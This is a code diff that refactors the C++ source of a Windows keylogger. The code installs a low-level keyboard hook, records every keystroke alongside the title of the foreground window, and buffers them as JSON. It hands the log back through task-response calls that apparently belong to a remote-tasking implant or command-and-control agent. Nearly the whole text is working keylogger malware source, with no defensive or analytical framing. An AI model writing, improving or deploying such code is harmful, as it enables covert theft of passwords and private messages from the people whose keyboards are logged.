@@ -1,191 +1,155 @@
-/*
-MIT License
-
-Copyright (c) 2025 solveditnpc
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-*/
-
 #include "Keylogger.h"
 
-// Initialize the static member
-Keylogger *Keylogger::active_instance = nullptr;
+#include <chrono>
 
-// Implement the keylog_start method
-int Keylogger::keylog_start(const int &taskID)
+std::atomic<Keylogger *> Keylogger::active_instance{nullptr};
+
+Keylogger::~Keylogger()
 {
-    if (active_instance != nullptr)
+    keylog_stop();
+}
+
+Response Keylogger::keylog_start(const int &taskID)
+{
+    Keylogger *expected = nullptr;
+    if (!active_instance.compare_exchange_strong(expected, this))
     {
-        // Keylogger is already running
-        return 1;
+        return CreateTaskResponse(taskID, KEYLOGGER_START, NO_CODE, TASK_ERROR,
+                                  TaskError{1, "Keylogger is already running."});
     }
 
-    active_instance = this;
-    hook_thread_id = GetCurrentThreadId();
+    {
+        std::lock_guard lock(state_mutex);
+        first_json_entry = true;
+        keylog_data = "[";
+        current_window.clear();
+        last_window = NULL;
+    }
+
     logging_enabled = true;
+    hook_thread = std::thread(&Keylogger::hook_loop, this);
+    return CreateTaskResponse(taskID, KEYLOGGER_START, NO_CODE, RUNNING,
+                              TaskSuccess{"Keylogger started successfully."});
+}
+
+void Keylogger::hook_loop()
+{
+    hook_thread_id = GetCurrentThreadId();
     keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_proc, GetModuleHandle(NULL), 0);
     if (keyboard_hook == NULL)
     {
         logging_enabled = false;
-        hook_thread_id = 0;
-        active_instance = nullptr;
-        return 1;
+        return;
     }
 
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0))
+    MSG message;
+    while (logging_enabled)
     {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-
-    // Cleanup
-    logging_enabled = false;
-    UnhookWindowsHookEx(keyboard_hook);
-    keyboard_hook = NULL;
-    active_instance = nullptr;
-
-    return CreateTaskResponse(taskID, KEYLOGGER, NO_CODE, SUCCESS, TaskSuccess{"Keylogger started successfully."});
-}
-
-// Implement the keylog_stop method
-int Keylogger::keylog_stop()
-{
-    if (active_instance == nullptr)
-    {
-        // Keylogger is not running
-        return 1;
+        while (PeekMessage(&message, NULL, 0, 0, PM_REMOVE))
+        {
+            if (message.message == WM_QUIT)
+            {
+                logging_enabled = false;
+                break;
+            }
+            TranslateMessage(&message);
+            DispatchMessage(&message);
+        }
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
     }
 
     UnhookWindowsHookEx(keyboard_hook);
     keyboard_hook = NULL;
-    PostThreadMessage(hook_thread_id, WM_QUIT, 0, 0);
     hook_thread_id = 0;
-    active_instance = nullptr;
-
-    return 0;
 }
 
-// Implement the hook_proc method
+bool Keylogger::keylog_stop()
+{
+    Keylogger *instance = active_instance.load();
+    if (instance != this)
+        return false;
+
+    logging_enabled = false;
+    if (hook_thread_id != 0)
+        PostThreadMessage(hook_thread_id, WM_QUIT, 0, 0);
+    if (hook_thread.joinable())
+        hook_thread.join();
+    active_instance.compare_exchange_strong(instance, nullptr);
+    return true;
+}
+
 LRESULT CALLBACK Keylogger::hook_proc(int code, WPARAM wParam, LPARAM lParam)
 {
-    if (code >= 0 && active_instance != nullptr)
+    Keylogger *instance = active_instance.load();
+    if (code >= 0 && instance != nullptr && instance->logging_enabled)
     {
-        KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
-
-        // Check for window change
+        const auto *key = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
         HWND current_hwnd = GetForegroundWindow();
-        if (current_hwnd != active_instance->last_window)
+        if (current_hwnd != instance->last_window)
         {
-            active_instance->last_window = current_hwnd;
-            std::string new_window = active_instance->get_active_window_title();
-            if (new_window != active_instance->current_window)
+            instance->last_window = current_hwnd;
+            std::string window = instance->get_active_window_title();
+            if (window != instance->current_window)
             {
-                active_instance->current_window = new_window;
-                active_instance->append_json_event(
-                    "window", active_instance->current_window,
-                    active_instance->current_window);
+                instance->current_window = window;
+                instance->append_json_event("window", window, window);
             }
         }
 
         if (wParam == WM_KEYDOWN)
         {
-            std::string key_pressed;
-            switch (pkey->vkCode)
+            std::string value;
+            switch (key->vkCode)
             {
-            case VK_RETURN:
-                key_pressed = "(ENTER)\n";
-                break;
-            case VK_BACK:
-                key_pressed = "(BACKSPACE)";
-                break;
-            case VK_SPACE:
-                key_pressed = " ";
-                break;
-            case VK_TAB:
-                key_pressed = "(TAB)";
-                break;
+            case VK_RETURN: value = "(ENTER)\n"; break;
+            case VK_BACK: value = "(BACKSPACE)"; break;
+            case VK_SPACE: value = " "; break;
+            case VK_TAB: value = "(TAB)"; break;
             case VK_SHIFT:
             case VK_LSHIFT:
-            case VK_RSHIFT:
-                key_pressed = "(SHIFT)";
-                break;
+            case VK_RSHIFT: value = "(SHIFT)"; break;
             case VK_CONTROL:
             case VK_LCONTROL:
-                key_pressed = "(CTRL)";
-                break;
-            case VK_ESCAPE:
-                key_pressed = "(ESCAPE)";
-                break;
-            case VK_END:
-                key_pressed = "(END)";
-                break;
-            case VK_HOME:
-                key_pressed = "(HOME)";
-                break;
-            case VK_LEFT:
-                key_pressed = "(LEFT)";
-                break;
-            case VK_UP:
-                key_pressed = "(UP)";
-                break;
-            case VK_RIGHT:
-                key_pressed = "(RIGHT)";
-                break;
-            case VK_DOWN:
-                key_pressed = "(DOWN)";
-                break;
-            case VK_DELETE:
-                key_pressed = "(DELETE)";
-                break;
+            case VK_RCONTROL: value = "(CTRL)"; break;
+            case VK_ESCAPE: value = "(ESCAPE)"; break;
+            case VK_END: value = "(END)"; break;
+            case VK_HOME: value = "(HOME)"; break;
+            case VK_LEFT: value = "(LEFT)"; break;
+            case VK_UP: value = "(UP)"; break;
+            case VK_RIGHT: value = "(RIGHT)"; break;
+            case VK_DOWN: value = "(DOWN)"; break;
+            case VK_DELETE: value = "(DELETE)"; break;
             default:
-                // Handle regular characters
-                char key = MapVirtualKey(pkey->vkCode, MAPVK_VK_TO_CHAR);
-                if (key != 0)
-                {
-                    key_pressed = key;
-                }
+            {
+                char character = static_cast<char>(MapVirtualKey(key->vkCode, MAPVK_VK_TO_CHAR));
+                if (character != 0)
+                    value = character;
+                break;
             }
-
-            // while testing uncomment the next line below
-            // printf("%s", key_pressed.c_str());
-            active_instance->append_json_event(
-                "key", key_pressed, active_instance->current_window);
+            }
+            if (!value.empty())
+                instance->append_json_event("key", value, instance->current_window);
         }
     }
-
     return CallNextHookEx(NULL, code, wParam, lParam);
 }
 
-// Implement the get_keylog_data method
-TaskResponse<std::string> Keylogger::get_keylog_data(const int &taskID)
+Response Keylogger::get_keylog_data(const int &taskID)
 {
-    if (active_instance != nullptr)
+    keylog_stop();
+    std::string result;
     {
-        active_instance->keylog_stop();
+        std::lock_guard lock(state_mutex);
+        result = keylog_data + "\n]";
+        keylog_data = "[";
+        first_json_entry = true;
+        current_window.clear();
+        last_window = NULL;
     }
-
-    std::string result = keylog_data + "\n]";
-    return CreateTaskResponse(taskID, KEYLOGGER, NO_CODE, SUCCESS, TaskSuccess{result});
+    return CreateTaskResponse(taskID, KEYLOGGER_STOP, NO_CODE, SUCCESS,
+                              TaskSuccess{result});
 }
 
-// Implement the escape_json method
 std::string Keylogger::escape_json(const std::string &value)
 {
     std::string escaped;
@@ -193,53 +157,35 @@ std::string Keylogger::escape_json(const std::string &value)
     {
         switch (character)
         {
-        case '\\':
-            escaped += "\\\\";
-            break;
-        case '"':
-            escaped += "\\\"";
-            break;
-        case '\n':
-            escaped += "\\n";
-            break;
-        case '\r':
-            escaped += "\\r";
-            break;
-        case '\t':
-            escaped += "\\t";
-            break;
-        default:
-            escaped += character;
+        case '\\': escaped += "\\\\"; break;
+        case '"': escaped += "\\\""; break;
+        case '\n': escaped += "\\n"; break;
+        case '\r': escaped += "\\r"; break;
+        case '\t': escaped += "\\t"; break;
+        default: escaped += character; break;
         }
     }
     return escaped;
 }
 
-// Implement the append_json_event method
 void Keylogger::append_json_event(const std::string &type, const std::string &value,
                                   const std::string &window)
 {
     if (!logging_enabled)
-    {
         return;
-    }
-
+    std::lock_guard lock(state_mutex);
     if (!first_json_entry)
-    {
         keylog_data += ",";
-    }
-
     keylog_data += "\n  {\"type\":\"" + escape_json(type) +
                    "\",\"value\":\"" + escape_json(value) +
                    "\",\"window\":\"" + escape_json(window) + "\"}";
     first_json_entry = false;
 }
 
-// Implement the get_active_window_title method
 std::string Keylogger::get_active_window_title()
 {
-    char window_title[256];
+    char title[256]{};
     HWND hwnd = GetForegroundWindow();
-    GetWindowTextA(hwnd, window_title, sizeof(window_title));
-    return std::string(window_title);
+    GetWindowTextA(hwnd, title, sizeof(title));
+    return std::string(title);
 }
